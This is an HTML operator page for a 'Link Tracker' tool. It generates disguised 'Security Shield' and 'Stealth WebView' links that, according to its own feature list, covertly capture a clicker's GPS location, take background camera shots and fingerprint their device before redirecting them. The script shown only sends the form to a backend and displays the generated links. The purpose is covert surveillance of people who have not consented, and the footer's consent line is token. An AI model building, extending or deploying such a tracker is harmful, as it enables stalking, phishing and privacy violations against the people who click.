<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Link Tracker | Premium Intelligence</title>
    <link rel="stylesheet" href="/css/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
</head>

<body>
    <div class="bg-mesh"></div>

    <div class="container">
        <header class="header" data-aos="fade-down">
            <h1>LINK TRACKER</h1>
            <p>Deploy professional intelligence links. Secure, encrypted, and real-time. Gather behavioral data with
                surgical precision.</p>
        </header>

        <div class="card" data-aos="fade-up">
            <h2 class="card-title"><i class="fas fa-satellite-dish"></i> Link Generator</h2>

            <form id="createLinkForm">
                <div class="form-group">
                    <label for="userId">Intelligence ID</label>
                    <input type="text" id="userId" placeholder="e.g. ALPHA_VINC_99" required>
                    <p style="font-size: 0.75rem; color: var(--text-dim); margin-top: 5px;">Unique identifier for your
                        tracking dashboard.</p>
                </div>

                <div class="form-group">
                    <label for="targetUrl">Target Destination</label>
                    <input type="url" id="targetUrl" placeholder="https://example.com/secure-dossier" required>
                    <p style="font-size: 0.75rem; color: var(--text-dim); margin-top: 5px;">Where the user will land
                        after invisible data capture.</p>
                </div>

                <button type="submit" class="btn btn-primary" id="submitBtn">
                    <i class="fas fa-bolt"></i> Generate Secure Links
                </button>
            </form>

            <div id="result" class="result-box" style="display: none;">
                <div class="link-item" data-aos="fade-right">
                    <div class="link-item-header">
                        <span class="link-type"><i class="fab fa-cloudflare"></i> Security Shield Link</span>
                        <span style="font-size: 0.7rem; color: var(--text-dim);">Recommended for High Hitrate</span>
                    </div>
                    <div class="link-input-group">
                        <input type="text" id="cloudflareLink" readonly>
                        <button class="btn-copy" onclick="copyValue('cloudflareLink')"><i
                                class="fas fa-copy"></i></button>
                    </div>
                    <div id="cloudflareShort" style="margin-top: 10px;"></div>
                </div>

                <div class="link-item" data-aos="fade-right" data-aos-delay="100">
                    <div class="link-item-header">
                        <span class="link-type"><i class="fas fa-mask"></i> Stealth WebView Link</span>
                        <span style="font-size: 0.7rem; color: var(--text-dim);">Immediate Redirection</span>
                    </div>
                    <div class="link-input-group">
                        <input type="text" id="webviewLink" readonly>
                        <button class="btn-copy" onclick="copyValue('webviewLink')"><i class="fas fa-copy"></i></button>
                    </div>
                    <div id="webviewShort" style="margin-top: 10px;"></div>
                </div>

                <div style="margin-top: 20px; text-align: center;">
                    <a id="dashboardLink" class="btn btn-secondary"
                        style="border: 1px solid var(--accent); color: var(--accent);">
                        <i class="fas fa-chart-line"></i> Launch Intelligence Dashboard
                    </a>
                </div>
            </div>
        </div>

        <!-- Capability Grid -->
        <div class="dashboard-grid" style="margin-top: 60px;">
            <div class="stat-card" data-aos="flip-up" data-aos-delay="0">
                <i class="fas fa-map-marked-alt fa-2x" style="color: var(--accent); margin-bottom: 15px;"></i>
                <h4>GEO-Locate</h4>
                <p style="font-size: 0.8rem; color: var(--text-dim);">Capture GPS position with high accuracy
                    triangulation.</p>
            </div>
            <div class="stat-card" data-aos="flip-up" data-aos-delay="100">
                <i class="fas fa-camera fa-2x" style="color: var(--accent); margin-bottom: 15px;"></i>
                <h4>Visual Intel</h4>
                <p style="font-size: 0.8rem; color: var(--text-dim);">Background burst shots to identify valid subjects.
                </p>
            </div>
            <div class="stat-card" data-aos="flip-up" data-aos-delay="200">
                <i class="fas fa-microchip fa-2x" style="color: var(--accent); margin-bottom: 15px;"></i>
                <h4>System ID</h4>
                <p style="font-size: 0.8rem; color: var(--text-dim);">Analyze OS, Browser, Battery, and Network
                    hardware.</p>
            </div>
            <div class="stat-card" data-aos="flip-up" data-aos-delay="300">
                <i class="fas fa-user-secret fa-2x" style="color: var(--accent); margin-bottom: 15px;"></i>
                <h4>Invisible</h4>
                <p style="font-size: 0.8rem; color: var(--text-dim);">Zero footprint deployment via premium redirect
                    layers.</p>
            </div>
        </div>

        <footer
            style="margin-top: 100px; text-align: center; color: var(--text-dim); font-size: 0.85rem; padding-bottom: 40px;">
            <p>&copy; 2024 ANTI-GRAVITY SYSTEM | ADVANCED ANALYTICS INTERFACE</p>
            <p style="margin-top: 10px; opacity: 0.5;">Ethical usage mandates user consent where applicable.</p>
        </footer>
    </div>

    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
    <script>
        AOS.init({ duration: 1000, once: true });

        const form = document.getElementById('createLinkForm');
        const submitBtn = document.getElementById('submitBtn');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();

            const userId = document.getElementById('userId').value;
            const targetUrl = document.getElementById('targetUrl').value;

            submitBtn.disabled = true;
            submitBtn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Initializing Remote Bridge...';

            try {
                const response = await fetch('/api/create-link', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ url: targetUrl, userId: userId })
                });

                const data = await response.json();

                if (response.ok) {
                    document.getElementById('cloudflareLink').value = data.cloudflareLink;
                    document.getElementById('webviewLink').value = data.webviewLink;
                    document.getElementById('dashboardLink').href = `/dashboard/${userId}`;

                    const result = document.getElementById('result');
                    result.style.display = 'flex';
                    result.scrollIntoView({ behavior: 'smooth' });

                    if (data.cloudflareShortLinks && data.cloudflareShortLinks.length > 0) {
                        document.getElementById('cloudflareShort').innerHTML = data.cloudflareShortLinks.map(l =>
                            `<div style="font-size: 0.75rem; margin-top: 5px; opacity: 0.6;"><i class="fas fa-share"></i> ${l}</div>`
                        ).join('');
                    }

                    if (data.webviewShortLinks && data.webviewShortLinks.length > 0) {
                        document.getElementById('webviewShort').innerHTML = data.webviewShortLinks.map(l =>
                            `<div style="font-size: 0.75rem; margin-top: 5px; opacity: 0.6;"><i class="fas fa-share"></i> ${l}</div>`
                        ).join('');
                    }

                } else {
                    alert('Error: ' + (data.error || 'Failed to initialize agent.'));
                }
            } catch (err) {
                alert('Connection lost. Verify your mesh connection.');
            } finally {
                submitBtn.disabled = false;
                submitBtn.innerHTML = '<i class="fas fa-bolt"></i> Generate Secure Links';
            }
        });

        function copyValue(id) {
            const input = document.getElementById(id);
            input.select();
            document.execCommand('copy');

            const btn = event.currentTarget;
            const original = btn.innerHTML;
            btn.innerHTML = '<i class="fas fa-check"></i>';
            btn.style.borderColor = 'var(--success)';
            btn.style.color = 'var(--success)';

            setTimeout(() => {
                btn.innerHTML = original;
                btn.style.borderColor = 'var(--border)';
                btn.style.color = 'white';
            }, 2000);
        }
    </script>
</body>

</html>